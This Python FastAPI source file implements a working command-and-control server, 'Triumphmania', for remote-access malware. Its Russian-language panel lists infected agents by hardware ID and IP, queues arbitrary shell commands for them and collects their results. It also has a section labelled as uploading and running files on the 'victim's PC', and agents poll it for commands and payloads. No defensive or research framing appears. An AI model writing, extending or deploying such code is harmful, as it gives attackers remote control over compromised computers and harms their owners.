import os
from fastapi import FastAPI, BackgroundTasks, HTTPException, Request, UploadFile, File
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

app = FastAPI(title="Triumphmania Advanced Command Center")

agents = {}
command_queue = {}
command_results = {}
uploaded_files_storage = "storage_payloads"

os.makedirs(uploaded_files_storage, exist_ok=True)

class CommandModel(BaseModel):
    command: str

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    html_content = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <title>Triumphmania Advanced Control Panel</title>
        <style>
            body { background: #0f172a; color: #e2e8f0; font-family: monospace; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #334155; padding: 10px; text-align: left; }
            th { background: #1e293b; }
            textarea, input { background: #1e293b; color: #fff; border: 1px solid #475569; padding: 8px; width: 100%; }
            button { background: #3b82f6; color: #fff; border: none; padding: 8px 16px; cursor: pointer; }
            button:hover { background: #2563eb; }
            .panel { background: #1e293b; padding: 15px; margin-top: 15px; border: 1px solid #334155; }
        </style>
    </head>
    <body>
        <h1>[Triumphmania] Расширенная панель управления</h1>
        <h2>Активные агенты</h2>
        <table id="agents-table">
            <tr><th>HWID / IP</th><th>Статус</th><th>Действие</th></tr>
        </table>
        
        <div class="panel">
            <h2>Управление терминалом</h2>
            <input type="text" id="target-id" placeholder="HWID цели">
            <br><br>
            <textarea id="cmd-input" rows="2" placeholder="Введите команду"></textarea>
            <br><br>
            <button onclick="sendCmd()">Отправить команду</button>
            <h3>Вывод:</h3>
            <pre id="output" style="background:#0f172a; padding:15px; min-height:100px;"></pre>
        </div>

        <div class="panel">
            <h2>Загрузка файла на ПК жертвы</h2>
            <input type="text" id="upload-target-id" placeholder="HWID цели">
            <input type="file" id="file-to-upload">
            <br><br>
            <button onclick="uploadFile()">Загрузить и запустить</button>
        </div>

        <script>
            async function fetchAgents() {
                let res = await fetch('/api/agents');
                let data = await res.json();
                let table = document.getElementById('agents-table');
                table.innerHTML = '<tr><th>HWID / IP</th><th>Статус</th><th>Действие</th></tr>';
                for (let id of data) {
                    table.innerHTML += `<tr><td>${id}</td><td>Активен</td><td><button onclick="document.getElementById('target-id').value='${id}'; document.getElementById('upload-target-id').value='${id}';">Выбрать</button></td></tr>`;
                }
            }
            async function sendCmd() {
                let id = document.getElementById('target-id').value;
                let cmd = document.getElementById('cmd-input').value;
                let res = await fetch('/api/command/' + id, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd})
                });
                let data = await res.json();
                document.getElementById('output').innerText = "Команда отправлена в очередь.";
            }
            async function uploadFile() {
                let id = document.getElementById('upload-target-id').value;
                let fileInput = document.getElementById('file-to-upload');
                if(!id || fileInput.files.length === 0) { alert('Укажите HWID и выберите файл'); return; }
                let formData = new FormData();
                formData.append('file', fileInput.files[0]);
                let res = await fetch('/api/upload-to-client/' + id, { method: 'POST', body: formData });
                let data = await res.json();
                alert(data.status || "Файл передан агенту.");
            }
            setInterval(fetchAgents, 3000);
            fetchAgents();
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.get("/api/agents")
async def get_agents():
    return JSONResponse(content=list(agents.keys()))

@app.post("/api/command/{hwid}")
async def post_command(hwid: str, body: CommandModel):
    command_queue[hwid] = body.command
    return {"status": "queued"}

@app.get("/api/poll/{hwid}")
async def poll_command(hwid: str):
    agents[hwid] = True
    cmd = command_queue.pop(hwid, None)
    file_dl = command_queue.pop(hwid + "_file", None)
    return {"command": cmd, "download_file": file_dl}

@app.post("/api/upload-to-client/{hwid}")
async def upload_to_client(hwid: str, file: UploadFile = File(...)):
    file_path = os.path.join(uploaded_files_storage, file.filename)
    with open(file_path, "wb") as buffer:
        buffer.write(await file.read())
    command_queue[hwid + "_file"] = file.filename
    return {"status": "success", "filename": file.filename}

@app.get("/api/download-file/{filename}")
async def download_file(filename: str):
    from fastapi.responses import FileResponse
    return FileResponse(os.path.join(uploaded_files_storage, filename))

@app.post("/api/result/{hwid}")
async def post_result(hwid: str, request: Request):
    data = await request.json()
    command_results[hwid] = data.get("result", "")
    return {"status": "received"}
